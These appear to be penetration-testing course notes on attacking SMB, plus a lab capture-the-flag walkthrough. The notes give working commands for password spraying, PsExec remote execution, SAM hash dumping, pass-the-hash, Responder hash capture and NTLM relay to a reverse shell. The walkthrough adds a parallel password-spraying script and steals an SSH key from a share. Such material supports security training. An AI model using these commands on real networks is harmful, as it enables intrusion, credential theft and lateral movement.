# 07 — Attacking SMB

## Overview

SMB (Server Message Block) is one of the most attack-rich protocols in Windows environments. It provides file/printer sharing, remote execution paths, credential capture opportunities, and hash relay vectors. Understanding both Linux (Samba) and Windows SMB implementations is essential for any engagement.

---

## SMB Port Reference

| Port | Protocol | Use |
|------|----------|-----|
| **445/TCP** | SMB over TCP/IP (direct) | Modern Windows — primary target |
| **139/TCP** | SMB over NetBIOS (NBT) | Legacy / non-Windows hosts (Samba) |
| **137/UDP** | NetBIOS Name Service | Name resolution |
| **138/UDP** | NetBIOS Datagram | Browsing/announcements |

> If NetBIOS is enabled or the target is non-Windows, SMB runs on **139**. Otherwise, use **445**.

**Related Protocol:** MSRPC uses SMB named pipes as transport — relevant for RPC-based enumeration and attacks.

---

## Enumeration

### Nmap Scan
```bash
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

**Key info returned:**
- SMB version (e.g., Samba smbd 4.6.2)
- Hostname
- OS (Linux vs Windows — inferred from implementation)
- SMB signing status
- NetBIOS name

> Windows targets often don't return version info — Nmap will guess the OS instead.

---

## Null Session / Anonymous Authentication

SMB can be configured to allow connections without credentials — a **null session**.

### smbclient — List Shares
```bash
smbclient -N -L //10.129.14.128
```

### smbmap — List Shares + Permissions
```bash
smbmap -H 10.129.14.128
```

### smbmap — Browse Share Recursively
```bash
smbmap -H 10.129.14.128 -r notes
```

### smbmap — Download File
```bash
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

### smbmap — Upload File
```bash
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

---

## RPC Enumeration (Null Session)

```bash
rpcclient -U'%' 10.10.110.17
```

**Useful rpcclient commands:**

| Command | Output |
|---------|--------|
| `enumdomusers` | List domain users + RIDs |
| `enumdomgroups` | List domain groups |
| `queryuser <RID>` | Details on a specific user |
| `getdompwinfo` | Password policy |
| `netshareenumall` | List all shares |

### enum4linux-ng (Automated)
```bash
./enum4linux-ng.py 10.10.11.45 -A -C
```

Automates: workgroup/domain name, users, OS, groups, shares, password policy.

---

## Brute Force & Password Spraying

| Method | Risk | When to Use |
|--------|------|-------------|
| **Brute Force** | Can lock accounts | Only if lockout threshold is known |
| **Password Spray** | Low lockout risk | Preferred — one password across many users |

> Safe spray cadence: **2-3 attempts**, wait **30-60 minutes** between rounds.

### CrackMapExec — Password Spray
```bash
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

| Flag | Purpose |
|------|---------|
| `--local-auth` | Use for non-domain-joined machines |
| `--continue-on-success` | Keep spraying after a hit |
| `-u` | User list file |
| `-p` | Password to spray |

---

## Remote Code Execution

### Impacket PsExec
```bash
impacket-psexec administrator:'Password123!'@10.10.110.17
```
- Uploads a service binary to `ADMIN$`
- Creates and starts a service via DCE/RPC
- Drops you into a `SYSTEM` shell

### CrackMapExec — Execute Commands
```bash
# CMD
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

# PowerShell
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -X 'whoami' --exec-method smbexec
```

> If `--exec-method` is not specified, CME defaults to `atexec`. Use `smbexec` if atexec fails.

### RCE Tool Comparison

| Tool | Method | Notes |
|------|--------|-------|
| `impacket-psexec` | Uploads RemComSvc binary to ADMIN$ | Requires writable ADMIN$ |
| `impacket-smbexec` | No binary upload — uses local SMB server for output | Works when no writable share available |
| `impacket-atexec` | Task Scheduler via SMB | Stealthier, leaves scheduled task artifacts |
| `crackmapexec` | Wraps smbexec/atexec | Multi-host, scriptable |
| `metasploit psexec` | Ruby implementation | Full Meterpreter integration |

---

## Enumerate Logged-On Users
```bash
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```
Scans entire subnet — useful for finding active sessions for lateral movement targeting.

---

## Extract SAM Hashes
```bash
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

**SAM hash format:** `username:RID:LMhash:NThash:::`

**Uses for harvested hashes:**
- Crack offline with hashcat
- Pass-the-Hash (PtH) without cracking
- Authenticate to other services reusing the same password

---

## Pass-the-Hash (PtH)

Use an NTLM hash directly instead of a plaintext password — no cracking needed.

```bash
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

Works with: `impacket-psexec`, `impacket-smbexec`, `smbmap`, `crackmapexec`, and others.

---

## Forced Authentication — Responder (Hash Capture)

Exploit LLMNR/NBT-NS name resolution to capture NTLMv2 hashes when users try to access non-existent shares.

### Start Responder
```bash
sudo responder -I ens33
```

### How It Works
1. User mistyps a share name (e.g., `\\mysharefoder\`)
2. DNS fails → machine broadcasts LLMNR/NBT-NS query
3. Responder answers the broadcast, posing as the target
4. Victim sends NTLMv2 challenge/response → captured

### Crack Captured Hash
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Hashes saved to: `/usr/share/responder/logs/`

> Multiple hashes for the same account = normal. NTLMv2 uses randomized challenges per session, so hashes differ but represent the same password.

---

## NTLM Relay Attack (When You Can't Crack)

If cracking fails, **relay** the hash to authenticate to another machine.

### Step 1 — Disable SMB in Responder
```bash
# Edit /etc/responder/Responder.conf
SMB = Off
```

### Step 2 — Start ntlmrelayx (SAM dump)
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

### Step 3 — ntlmrelayx with Reverse Shell
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 \
  -c 'powershell -e <base64_encoded_payload>'
```

Generate payload at: [https://www.revshells.com](https://www.revshells.com) → PowerShell #3 (Base64)

### Catch the Shell
```bash
nc -lvnp 9001
```

---

## RPC for System Modification

Beyond enumeration, `rpcclient` can make changes if permissions allow:

| Action | Command |
|--------|---------|
| Change a user's password | `setuserinfo2` |
| Create a domain user | `createdomuser` |
| Create a shared folder | `netshareadd` |

---

## Attack Path Summary

```
SMB Null Session
    ↓
Enumerate shares (smbclient/smbmap) + users (rpcclient/enum4linux)
    ↓
Brute force / password spray (CrackMapExec)
    ↓
RCE (psexec/smbexec/atexec/CME)
    ↓
SAM dump → NTLM hashes
    ↓
Pass-the-Hash → lateral movement
         OR
Responder → NTLMv2 capture → crack / relay
```

---

## Key Takeaways

| Concept | Takeaway |
|---------|----------|
| Ports 139 vs 445 | 445 = direct TCP; 139 = NetBIOS layer (legacy/Samba) |
| Null sessions | Always test — exposes users, shares, policies |
| Password spray > brute force | Avoids lockouts; 2-3 attempts per round |
| PsExec requires ADMIN$ write | smbexec works without a writable share |
| Pass-the-Hash | NTLM hashes authenticate directly — no cracking needed |
| Responder + relay | Even uncrachable hashes can be weaponized via relay |
| SMB signing OFF | Required for relay attacks to succeed |

---

## Full Attack Chain — HTB Exercise (10.129.203.6)

End-to-end walkthrough of the Section 7 SMB exercise, demonstrating null-session enum → user discovery → password spray → SMB share key theft → SSH publickey login.

### 1. Initial Recon — Nmap
```bash
sudo nmap -sV -sC -p22,139,445 10.129.203.6
```
Result: SSH (OpenSSH), SMB on 139/445, **Samba 4** on Linux. NetBIOS name `ATTCSVC-LINUX`, workgroup `WORKGROUP`.

### 2. Null-Session Share Enumeration
```bash
smbclient -N -L //10.129.203.6/
smbmap -H 10.129.203.6 -u '' -p ''
```
Findings:
| Share | Access | Notes |
|-------|--------|-------|
| `print$` | NO ACCESS | — |
| `GGJ`    | READ ONLY | Contains `id_rsa` (download blocked for null session) |
| `IPC$`   | NO ACCESS | — |

### 3. RPC User Enumeration
```bash
rpcclient -U'%' 10.129.203.6 -c 'enumdomusers'
```
Result:
```
user:[jason] rid:[0x3e8]
user:[robin] rid:[0x3e9]
```
Two domain users discovered without authentication.

### 4. Password Spray (rpcclient + xargs)
HTB-supplied wordlist saved to `/tmp/pws.list` (333 passwords). Hydra refuses (server rejects SMBv1). nxc is slow. Built a parallel rpcclient sprayer:

`/tmp/sprayone.sh`:
```bash
#!/bin/bash
PW="$1"
out=$(rpcclient -U "jason%$PW" 10.129.203.6 -c 'getusername;quit' 2>&1)
if echo "$out" | grep -q 'Account Name'; then
  echo "FOUND: jason : $PW"
fi
```
Driver:
```bash
chmod +x /tmp/sprayone.sh
xargs -a /tmp/pws.list -P 20 -I{} /tmp/sprayone.sh {} | tee /tmp/spray.found
```
**Result:** `FOUND: jason : 34c8zuNBo91!@28Bszh`

### 5. SMB Authenticated Re-Enumeration → Loot id_rsa
```bash
smbclient '//10.129.203.6/GGJ' -U 'jason%34c8zuNBo91!@28Bszh' \
    -c 'ls; get id_rsa /tmp/jason_id_rsa'
```
The GGJ share that returned `NT_STATUS_ACCESS_DENIED` to a null session yields a 3381-byte OpenSSH private key once authenticated.

### 6. SSH Login (publickey, password auth disabled)
SSH on this target rejects password auth (`Permission denied (publickey)`), but the recovered key works:
```bash
chmod 600 /tmp/jason_id_rsa
ssh -i /tmp/jason_id_rsa jason@10.129.203.6 'cat ~/flag.txt'
```
**Flag:** `HTB{SMB_4TT4CKS_2349872359}`

### Attack Chain Summary
```
nmap (22/139/445 open, Samba 4 Linux)
   ↓
smbclient -N -L  →  GGJ share visible, id_rsa hidden behind ACL
   ↓
rpcclient -U'%' -c enumdomusers  →  jason, robin
   ↓
xargs -P 20 rpcclient spray (jason + /tmp/pws.list)  →  jason : 34c8zuNBo91!@28Bszh
   ↓
smbclient -U jason → get id_rsa  (authenticated read of GGJ share)
   ↓
ssh -i id_rsa jason@target  →  cat ~/flag.txt
   ↓
HTB{SMB_4TT4CKS_2349872359}
```

### Lessons Learned
- **Always re-enumerate with credentials.** Shares that deny null sessions often expose lootable files (keys, configs, creds) once authenticated.
- **Password spraying beats brute force.** Parallel `xargs -P` + minimal-output wrapper script outperforms nxc/hydra on noisy terminals and avoids lockout-prone account-iteration patterns.
- **Hydra ≠ universal.** It refused both this SMB target ("does not support SMBv1") and SSH (key-only auth). rpcclient is a cleaner SMB credential oracle.
- **An id_rsa on a share is a kill chain.** Lateral movement was instantaneous once the key was recovered — even though SSH password auth was disabled.
- **Filter output aggressively when chaining.** A noisy local shell rc (p10k + netstat banner) buried real findings; one-shot wrapper scripts that write tiny result files (`/tmp/spray.found`) are far more reliable than parsing 50 KB of stdout.
